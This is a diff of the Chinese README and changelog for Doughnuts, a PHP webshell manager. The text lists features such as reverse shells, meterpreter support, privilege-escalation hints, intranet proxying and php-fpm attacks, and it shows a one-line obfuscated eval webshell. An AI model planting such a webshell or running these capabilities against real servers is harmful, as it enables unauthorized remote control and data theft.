@@ -2,17 +2,15 @@
 
 *一个基于Python3.6+的PHPwebshell管理器*
 
-![main1.png](https://i.loli.net/2020/11/15/QhsPHi7DojbMXcu.png)
+![](https://gitee.com/guuest/images/raw/master/img/20210705094530.png)
 
-![info1.png](https://i.loli.net/2020/11/15/rjAd6hO4fQEWXbi.png)
+![image-20210705094640194](https://gitee.com/guuest/images/raw/master/img/image-20210705094640194.png)
 
-![part1.png](https://i.loli.net/2020/11/15/weaESdmyCxGV3Jr.png)
+![image-20210705094655002](https://gitee.com/guuest/images/raw/master/img/image-20210705094655002.png)
 
-![part2.png](https://i.loli.net/2020/11/15/pKlViB9qQvjh82F.png)
+![image-20210705094914453](https://gitee.com/guuest/images/raw/master/img/image-20210705094914453.png)
 
-![part3.png](https://i.loli.net/2020/11/15/P4T3GfyFXcNbkwQ.png)
-
-![part4.png](https://i.loli.net/2020/11/15/HZu3jdNXB4SoWxU.png)
+![image-20210705094924983](https://gitee.com/guuest/images/raw/master/img/image-20210705094924983.png)
 
 ## 使用文档
 
@@ -20,7 +18,7 @@
 
 ***文档中许多内容已经过期，请以新版为准***
 
-详细使用文档请前往[此页面](http://doughnuts.cc/)进行查看。
+详细使用文档请前往[此页面](https://doughnuts3.gitbook.io/)进行查看。
 
 ## 特征
 
@@ -53,6 +51,7 @@
     - 执行自定义的php代码
     - 获取一个临时的非完全交互式shell和webshell
     - 正向/反弹shell
+    - 可以支持弹meterpreter的shell(php代码实现)
     - (仅限双方均为*unix)获取完全交互式的反弹shell
     - 读/写/上传/下载/删除/搜索文件,目录打包,分段文件上传/下载
     - 数据库管理,临时的sql-shell,数据dump,分段dump
@@ -61,7 +60,6 @@
     - 内网网页文本式浏览代理，可自定义请求方法和数据
     - 开启socks5服务器
     - 检测suid文件并给出提权建议 / 检测杀毒软件
-    - 可以支持弹meterpreter的shell(php代码实现)
 - 易于扩展
 
 ## 依赖
@@ -171,7 +169,7 @@ docker run --rm -it longlone/doughnuts:cli
         eval(str_rot13(base64_decode($_REQUEST['2333'])));
         ?>
       ```
-    那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
+      那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
       
       ```
       connect http://localhost/test2.php POST 2333 rot13 base64
@@ -297,8 +295,15 @@ def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
 - 4.15.1
     - 修改bug
         - ps命令在无法读取/proc目录时没有输出报错
+        - execute,write,edit无法使用自定义编辑器或报错
     - 修改输出
         - touch
+    - 优化功能
+        - execute,write,edit
+            - 现在编辑一个临时的php文件而非无后缀文件
+            - 添加参数edit_args,用于提供编辑器的参数,例如execute code '"--wait"'
+            - 当使用code(即vscode)时会自动添加--wait参数
+    
 
 ### 4.14
 - 4.14.0
@@ -331,7 +336,6 @@ def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
 - 4.13.1
     - 修复bug
         - iconv.c源码
-        
 ### 4.12
 - 4.12.0
     - 新增功能
@@ -365,7 +369,7 @@ def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
             - gopher: 使用curl扩展与gopher协议攻击fpm端口
             - sock: 使用stream_socket_client攻击fpm-sock
             - http_sock: 使用fsockopen,pfsockopen连接fpm端口
-        
+    
 - 4.11.1
     - 修改fpm的sock和http_sock攻击方式,防止整个doughnuts卡死
 - 4.11.2
